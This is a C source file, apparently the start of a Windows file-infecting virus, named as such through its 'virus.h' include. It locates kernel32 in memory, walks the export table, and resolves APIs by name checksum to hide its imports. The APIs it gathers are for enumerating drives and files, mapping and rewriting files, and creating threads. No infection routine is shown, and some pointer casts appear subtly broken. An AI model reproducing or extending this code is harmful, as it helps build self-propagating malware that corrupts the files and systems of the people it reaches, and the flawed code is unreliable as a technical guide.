#include "virus.h"


void start_code(void) {}

void memdump(uint8_t *start, uint8_t *end) {
  printf("memdump:");
  uint32_t i = 0;
  while (start <= end) {
    if ((uint32_t)i % 16 == 0)
      printf("\n0x%X | ", start);
    else if ((uint32_t)i % 8 == 0)
      printf(" ");
    printf("%02X ", *start);
    start++;
    i++;
  }
  printf("\n");
}

IMAGE_NT_HEADERS* get_nt_header(uint8_t *base) {
  return (IMAGE_NT_HEADERS*) (base + *(base + 0x3C));
}

IMAGE_EXPORT_DIRECTORY* get_export_directory(uint8_t* base, IMAGE_NT_HEADERS* ntHdr) {
    return (IMAGE_EXPORT_DIRECTORY*) (base + ntHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
}

int run(void) {
  data_t data;
  IMAGE_NT_HEADERS *ntHdr = NULL;
  uint8_t *ptr = NULL;

  printf("current code size: %d bytes\n", end_code - start_code);

  data.imageBase = (uint8_t*) get_image_base();
  data.kernel32Base = (uint8_t*) get_kernel32_base();

  if (*(uint16_t*)data.imageBase != 0x5A4D)  //"MZ"
    return 1;

  if (*(uint16_t*)data.kernel32Base != 0x5A4D)  //"MZ"
    return 2;

  ntHdr = get_nt_header(data.kernel32Base);


  IMAGE_EXPORT_DIRECTORY *exportDir = get_export_directory(data.kernel32Base, ntHdr);
  printf("module name: %s\n", data.kernel32Base + exportDir->Name);

  if(FillAddresses(exportDir, data.kernel32Base, &data.functions) != sizeof(functions_t) / 4) {
    return 3;
  }

  return 0;
}

void* GetAddressByChecksum(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, uint32_t cs) {
  uint32_t* namePtr = (uint32_t*) (base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) (base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) (base + ed->AddressOfNameOrdinals);

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {
    printf(">>%s\n", base + *namePtr);

    if (checksum((const char*) base + *namePtr) == cs) {
      return (void*) base + *(addrPtr + *nameOrdinalsPtr);
    }

    namePtr++;
    nameOrdinalsPtr++;
  }
  return NULL;
}


int FillAddresses(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, functions_t* functions) {
  uint32_t* namePtr = (uint32_t*) (base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) (base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) (base + ed->AddressOfNameOrdinals);
  int functionCounter = 0;

  memset(functions, 0, sizeof(functions_t));

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {

    switch(checksum((const char*) base + *namePtr)) {
      case CS_EXITPROCESS:  functions->exitProcess = (fpExitProcess*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETTICKCOUNT: functions->getTickCount = (fpGetTickCount*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETPROCESSHEAP: functions->getProcessHeap = (fpGetProcessHeap*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPALLOC: functions->heapAlloc = (fpHeapAlloc*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPFREE: functions->heapFree = (fpHeapFree*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDFIRSTFILEA:  functions->findFirstFileA = (fpFindFirstFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDNEXTFILEA: functions->findNextFileA = (fpFindNextFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDCLOSE: functions->findClose = (fpFindClose*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEA: functions->createFileA = (fpCreateFileA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETFILESIZE: functions->getFileSize = (fpGetFileSize*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEMAPPINGA:  functions->createFileMappingA = (fpCreateFileMappingA*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_MAPVIEWOFFILE: functions->mapViewOfFile = (fpMapViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FLUSHVIEWOFFILE: functions->flushViewOfFile = (fpFlushViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_UNMAPVIEWOFFILE: functions->unmapViewOfFile = (fpUnmapViewOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETFILEPOINTER: functions->setFilePointer = (fpSetFilePointer*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETENDOFFILE:  functions->setEndOfFile = (fpSetEndOfFile*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CLOSEHANDLE: functions->closeHandle = (fpCloseHandle*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      //case CS_COPYMEMORY: functions->copyMemory = (fpCopyMemory*) base + *(addrPtr + *nameOrdinalsPtr);
      //                      break;
      case CS_CREATETHREAD: functions->createThread = (fpCreateThread*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETLOGICALDRIVES: functions->getLogicalDrives = (fpGetLogicalDrives*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SLEEP: functions->sleep = (fpSleep*) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      default:              functionCounter--;
                            break;
    }
    functionCounter++;
    namePtr++;
    nameOrdinalsPtr++;
  }
  return functionCounter;
}
